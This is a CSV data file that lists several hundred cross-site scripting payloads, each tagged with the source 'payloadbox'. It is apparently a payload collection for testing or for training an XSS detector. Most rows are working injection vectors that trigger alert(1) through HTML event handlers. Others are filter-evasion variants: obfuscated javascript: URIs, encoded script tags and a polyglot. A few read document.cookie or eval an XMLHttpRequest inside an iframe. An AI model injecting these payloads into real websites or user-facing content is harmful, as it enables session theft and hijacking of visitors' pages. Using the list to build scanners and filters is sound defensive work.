text,source
"<footer onmouseup=""alert(1)"">test</footer>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",payloadbox
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">",payloadbox
<svg><ins onload=alert(1)></ins>,payloadbox
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",payloadbox
"<rtc onmouseenter=""alert(1)"">test</rtc>",payloadbox
"<noscript onkeypress=""alert(1)"" contenteditable>test</noscript>",payloadbox
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",payloadbox
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",payloadbox
"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>",payloadbox
<x </onxxx=1,payloadbox
"<u oncontextmenu=""alert(1)"">test</u>",payloadbox
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></sup>",payloadbox
"<div id=""134""><xmp>",payloadbox
"<meter oncopy=""alert(1)"" contenteditable>test</meter>",payloadbox
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",payloadbox
"<figcaption onmousemove=""alert(1)"">test</figcaption>",payloadbox
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,payloadbox
"<div id=""99"">XXX<style>",payloadbox
<svg><tr onload=alert(1)></tr>,payloadbox
"<style>:target {color:red;}</style><base id=x style=""transition:color 1s"" ontransitionend=alert(1)></base>",payloadbox
"<data onmouseout=""alert(1)"">test</data>",payloadbox
<image/src/onerror=prompt(8)>,payloadbox
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",payloadbox
"<ins onkeydown=""alert(1)"" contenteditable>test</ins>",payloadbox
"<param draggable=""true"" ondragleave=""alert(1)"">test</param>",payloadbox
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,payloadbox
<body onbeforeprint=alert(1)>,payloadbox
"<body onmousedown=""alert(1)"">test</body>",payloadbox
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,payloadbox
"<svg><path><animateMotion onrepeat=alert(1) dur=""1s"" repeatCount=""2"">",payloadbox
"<ins onmouseup=""alert(1)"">test</ins>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strong>",payloadbox
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",payloadbox
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",payloadbox
<svg onload=alert(1)>,payloadbox
"<optgroup draggable=""true"" ondrag=""alert(1)"">test</optgroup>",payloadbox
"<img onclick=""alert(1)"">test</img>",payloadbox
"<object onbeforecopy=""alert(1)"" contenteditable>test</object>",payloadbox
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",payloadbox
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",payloadbox
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",payloadbox
<img src/onerror=alert(1)>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",payloadbox
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,payloadbox
"<dialog draggable=""true"" ondragstart=""alert(1)"">test</dialog>",payloadbox
"<source onmouseleave=""alert(1)"">test</source>",payloadbox
"<dl onkeypress=""alert(1)"" contenteditable>test</dl>",payloadbox
"<element ondblclick=""alert(1)"">test</element>",payloadbox
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,payloadbox
"<samp onmouseenter=""alert(1)"">test</samp>",payloadbox
<marquee onstart=alert(1)>XSS</marquee>,payloadbox
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",payloadbox
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,payloadbox
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",payloadbox
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",payloadbox
<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,payloadbox
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",payloadbox
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",payloadbox
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",payloadbox
"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>",payloadbox
"<IMG SRC=""livescript:[code]"">",payloadbox
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",payloadbox
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",payloadbox
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",payloadbox
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",payloadbox
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",payloadbox
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",payloadbox
<small id=x tabindex=1 onfocusin=alert(1)></small>,payloadbox
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",payloadbox
<link onfocusin=alert(1) id=x tabindex=1 style=display:block>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",payloadbox
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,payloadbox
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationend=""alert(1)""></nextid>",payloadbox
"<img onmousemove=""alert(1)"">test</img>",payloadbox
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",payloadbox
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",payloadbox
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",payloadbox
*/alert(1)</script><script>/*,payloadbox
"<samp oncut=""alert(1)"" contenteditable>test</samp>",payloadbox
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></picture>",payloadbox
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",payloadbox
<meter id=x tabindex=1 onfocusin=alert(1)></meter>,payloadbox
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",payloadbox
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,payloadbox
<nav id=x tabindex=1 onfocus=alert(1)></nav>,payloadbox
"<footer ondblclick=""alert(1)"">test</footer>",payloadbox
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,payloadbox
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,payloadbox
"<param oncontextmenu=""alert(1)"">test</param>",payloadbox
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",payloadbox
"<title onmousedown=""alert(1)"">test</title>",payloadbox
"<content onmousedown=""alert(1)"">test</content>",payloadbox
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationstart=""alert(1)""></form>",payloadbox
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",payloadbox
<var id=x tabindex=1 onfocusin=alert(1)></var>,payloadbox
"<del draggable=""true"" ondragend=""alert(1)"">test</del>",payloadbox
"<dl onbeforepaste=""alert(1)"" contenteditable>test</dl>",payloadbox
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",payloadbox
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",payloadbox
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,payloadbox
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>",payloadbox
"<meter onpaste=""alert(1)"" contenteditable>test</meter>",payloadbox
"<xmp onmouseleave=""alert(1)"">test</xmp>",payloadbox
"<i draggable=""true"" ondragleave=""alert(1)"">test</i>",payloadbox
<svg><thead onload=alert(1)></thead>,payloadbox
"<svg onmousedown=""alert(1)"">test</svg>",payloadbox
<html id=x tabindex=1 onactivate=alert(1)></html>,payloadbox
"<dir draggable=""true"" ondragstart=""alert(1)"">test</dir>",payloadbox
<form onsubmit=alert(1)><input type=submit>,payloadbox
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,payloadbox
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,payloadbox
"<font onmouseleave=""alert(1)"">test</font>",payloadbox
"<strong onclick=""alert(1)"">test</strong>",payloadbox
"<ins onmouseenter=""alert(1)"">test</ins>",payloadbox
"<article oncopy=""alert(1)"" contenteditable>test</article>",payloadbox
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",payloadbox
"<picture onmouseover=""alert(1)"">test</picture>",payloadbox
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",payloadbox
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",payloadbox
<math>,payloadbox
"<nextid draggable=""true"" ondragstart=""alert(1)"">test</nextid>",payloadbox
"<header onbeforecut=""alert(1)"" contenteditable>test</header>",payloadbox
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",payloadbox
"<param onkeypress=""alert(1)"" contenteditable>test</param>",payloadbox
"<i oncopy=""alert(1)"" contenteditable>test</i>",payloadbox
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",payloadbox
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",payloadbox
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationstart=""alert(1)""></link>",payloadbox
"<basefont onmouseenter=""alert(1)"">test</basefont>",payloadbox
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",payloadbox
"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",payloadbox
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",payloadbox
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",payloadbox
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",payloadbox
"<select onkeypress=""alert(1)"" contenteditable>test</select>",payloadbox
"<marquee draggable=""true"" ondragenter=""alert(1)"">test</marquee>",payloadbox
"<menuitem onmouseover=""alert(1)"">test</menuitem>",payloadbox
<select id=x tabindex=1 onactivate=alert(1)></select>,payloadbox
"<dir onpaste=""alert(1)"" contenteditable>test</dir>",payloadbox
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",payloadbox
<th id=x tabindex=1 onfocusin=alert(1)></th>,payloadbox
<x onmousedown=alert(1)>click this!,payloadbox
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",payloadbox
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",payloadbox
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,payloadbox
"<dir ondblclick=""alert(1)"">test</dir>",payloadbox
<textarea onselect=alert(1) autofocus>XSS</textarea>,payloadbox
<x %6Fnxxx=1,payloadbox
"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" ontransitionend=alert(1)></big>",payloadbox
"<meter onmouseup=""alert(1)"">test</meter>",payloadbox
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationend=""alert(1)""></footer>",payloadbox
"<slot onpaste=""alert(1)"" contenteditable>test</slot>",payloadbox
"<strike onmousemove=""alert(1)"">test</strike>",payloadbox
"<time oncut=""alert(1)"" contenteditable>test</time>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>",payloadbox
"<link onpaste=""alert(1)"" contenteditable>test</link>",payloadbox
"<input ondblclick=""alert(1)"">test</input>",payloadbox
"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",payloadbox
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,payloadbox
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,payloadbox
"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",payloadbox
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,payloadbox
"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",payloadbox
"<h1 onmouseenter=""alert(1)"">test</h1>",payloadbox
"<meter onclick=""alert(1)"">test</meter>",payloadbox
"<caption onmouseover=""alert(1)"">test</caption>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",payloadbox
<svg onunload=window.open('javascript:alert(1)')>,payloadbox
"<style>@keyframes slidein {}</style><span style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></span>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",payloadbox
"<meta onmouseup=""alert(1)"">test</meta>",payloadbox
"<center onmouseenter=""alert(1)"">test</center>",payloadbox
"<video onmouseover=""alert(1)"">test</video>",payloadbox
"<time draggable=""true"" ondragleave=""alert(1)"">test</time>",payloadbox
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><rb id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rb>",payloadbox
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,payloadbox
"<image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E""/>",payloadbox
<time id=x tabindex=1 onactivate=alert(1)></time>,payloadbox
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",payloadbox
<area id=x tabindex=1 onactivate=alert(1)></area>,payloadbox
"<basefont onmouseup=""alert(1)"">test</basefont>",payloadbox
<svg><big onload=alert(1)></big>,payloadbox
"<param onbeforepaste=""alert(1)"" contenteditable>test</param>",payloadbox
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" ontransitionend=alert(1)></dd>",payloadbox
"<input onkeypress=""alert(1)"" contenteditable>test</input>",payloadbox
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",payloadbox
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",payloadbox
"<ul onmousedown=""alert(1)"">test</ul>",payloadbox
"<html onkeyup=""alert(1)"" contenteditable>test</html>",payloadbox
"<del onbeforecut=""alert(1)"" contenteditable>test</del>",payloadbox
<IMG SRC=JaVaScRiPt:alert('XSS')>,payloadbox
"<xmp onmouseup=""alert(1)"">test</xmp>",payloadbox
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",payloadbox
"<menu onbeforecopy=""alert(1)"" contenteditable>test</menu>",payloadbox
<table id=x tabindex=1 onactivate=alert(1)></table>,payloadbox
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></image>",payloadbox
<noembed id=x tabindex=1 onactivate=alert(1)></noembed>,payloadbox
<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>,payloadbox
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",payloadbox
"<template onclick=""alert(1)"">test</template>",payloadbox
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,payloadbox
"<th onkeydown=""alert(1)"" contenteditable>test</th>",payloadbox
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",payloadbox
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,payloadbox
<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>,payloadbox
"<textarea onmouseover=""alert(1)"">test</textarea>",payloadbox
"<image oncopy=""alert(1)"" contenteditable>test</image>",payloadbox
"<textarea onmousemove=""alert(1)"">test</textarea>",payloadbox
<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>,payloadbox
"<label oncut=""alert(1)"" contenteditable>test</label>",payloadbox
"<canvas onmousemove=""alert(1)"">test</canvas>",payloadbox
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",payloadbox
"<! '=""foo""><x foo='><img src=x onerror=alert(2)//'>",payloadbox
"<code onmousedown=""alert(1)"">test</code>",payloadbox
"<iframe onmouseenter=""alert(1)"">test</iframe>",payloadbox
"<figcaption onmouseover=""alert(1)"">test</figcaption>",payloadbox
"<article onmousedown=""alert(1)"">test</article>",payloadbox
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,payloadbox
"<dialog onmousedown=""alert(1)"">test</dialog>",payloadbox
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,payloadbox
"top[""al""+""ert""](1)",payloadbox
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",payloadbox
"<col draggable=""true"" ondragend=""alert(1)"">test</col>",payloadbox
"<div id=""125""><?xml version=""1.0""?>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>",payloadbox
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",payloadbox
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",payloadbox
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,payloadbox
"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",payloadbox
"<div oncontextmenu=""alert(1)"">test</div>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ins>",payloadbox
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",payloadbox
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",payloadbox
"<font onpaste=""alert(1)"" contenteditable>test</font>",payloadbox
"<marquee onbeforepaste=""alert(1)"" contenteditable>test</marquee>",payloadbox
"<style>@keyframes x{}</style><bdo style=""animation-name:x"" onanimationstart=""alert(1)""></bdo>",payloadbox
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",payloadbox
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></content>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tbody>",payloadbox
<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>,payloadbox
"<var onpaste=""alert(1)"" contenteditable>test</var>",payloadbox
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,payloadbox
"<track onpaste=""alert(1)"" contenteditable>test</track>",payloadbox
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionend=alert(1)></embed>",payloadbox
"<optgroup onkeydown=""alert(1)"" contenteditable>test</optgroup>",payloadbox
<plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>,payloadbox
"<style>:target {transform: rotate(180deg);}</style><keygen id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></keygen>",payloadbox
"<frame onmouseout=""alert(1)"">test</frame>",payloadbox
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,payloadbox
"<select draggable=""true"" ondragend=""alert(1)"">test</select>",payloadbox
"<cite draggable=""true"" ondrag=""alert(1)"">test</cite>",payloadbox
"<img onmousedown=""alert(1)"">test</img>",payloadbox
"<samp onmouseover=""alert(1)"">test</samp>",payloadbox
"<slot onbeforepaste=""alert(1)"" contenteditable>test</slot>",payloadbox
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",payloadbox
"<a onmouseout=""alert(1)"">test</a>",payloadbox
"<tr onmouseout=""alert(1)"">test</tr>",payloadbox
"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>",payloadbox
"<menuitem draggable=""true"" ondragstart=""alert(1)"">test</menuitem>",payloadbox
"<form onbeforecut=""alert(1)"" contenteditable>test</form>",payloadbox
